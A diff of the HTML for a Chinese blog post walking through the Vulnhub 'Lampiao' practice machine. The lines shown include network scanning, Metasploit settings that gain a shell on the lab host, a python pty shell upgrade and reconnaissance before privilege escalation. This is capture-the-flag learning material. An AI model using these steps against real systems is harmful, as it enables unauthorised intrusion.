@@ -96,13 +96,13 @@
 
 
 
-  <meta name="description" content="前言靶机难度不大 渗透测试信息收集 IP 端口  netdiscover -r 192.168.64.0/24     ​    namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubunt">
+  <meta name="description" content="前言常规型渗透、难度较小">
 <meta name="keywords" content="渗透测试,提权,vulnhub">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Lampiao渗透实战">
 <meta property="og:url" content="https://songxpu.github.io/2019/08/10/Lampiao/index.html">
 <meta property="og:site_name" content="Pines404">
-<meta property="og:description" content="前言靶机难度不大 渗透测试信息收集 IP 端口  netdiscover -r 192.168.64.0/24     ​    namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubunt">
+<meta property="og:description" content="前言常规型渗透、难度较小">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/ip.png">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/port1.png">
@@ -115,10 +115,10 @@
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/源码目录.png">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/mysql_user.png">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/dirtycow.png">
-<meta property="og:updated_time" content="2019-08-10T10:19:51.900Z">
+<meta property="og:updated_time" content="2019-08-10T11:55:26.391Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Lampiao渗透实战">
-<meta name="twitter:description" content="前言靶机难度不大 渗透测试信息收集 IP 端口  netdiscover -r 192.168.64.0/24     ​    namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubunt">
+<meta name="twitter:description" content="前言常规型渗透、难度较小">
 <meta name="twitter:image" content="https://songxpu.github.io/2019/08/10/Lampiao/ip.png">
 
 
@@ -439,7 +439,7 @@
                 
               
 
-              <time title="创建时间：2019-08-10 17:52:11 / 修改时间：18:19:51" itemprop="dateCreated datePublished" datetime="2019-08-10T17:52:11+08:00">2019-08-10</time>
+              <time title="创建时间：2019-08-10 17:52:11 / 修改时间：19:55:26" itemprop="dateCreated datePublished" datetime="2019-08-10T17:52:11+08:00">2019-08-10</time>
             
 
             
@@ -531,7 +531,9 @@
       
 
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>靶机难度不大</p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>常规型渗透、难度较小</p>
+ <a id="more"></a>
+
 <h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
 <li><p><strong>IP 端口</strong> </p>
 <p><code>netdiscover -r 192.168.64.0/24</code></p>
@@ -573,7 +575,7 @@
 
 <img src="//songxpu.github.io/2019/08/10/Lampiao/msf_options.png" width="700">
 
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> php_func system</span><br><span class="line"><span class="builtin-name">set</span> RHOSTS 192.168.64.146</span><br><span class="line"><span class="builtin-name">set</span> rport 1898</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set php_func system</span><br><span class="line">set RHOSTS 192.168.64.146</span><br><span class="line">set rport 1898</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <img src="//songxpu.github.io/2019/08/10/Lampiao/msf_meter.png" width="700">
 
@@ -581,7 +583,7 @@
 <p>msf的shell不是完整的shell，交互不完整；</p>
 <p>恰好此处安装了python，可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生虚拟终端</p>
 </blockquote>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="bash"></span></span><br><span class="line"><span class="bash">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
 
 <h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>首先获取系统信息</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:~/html$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@lampiao:~/html$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line">www-data@lampiao:~/html$ cat /proc/version</span><br><span class="line">cat /proc/version</span><br><span class="line">Linux version 4.4.0-31-generic (buildd@lgw01-01) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016</span><br></pre></td></tr></table></figure>
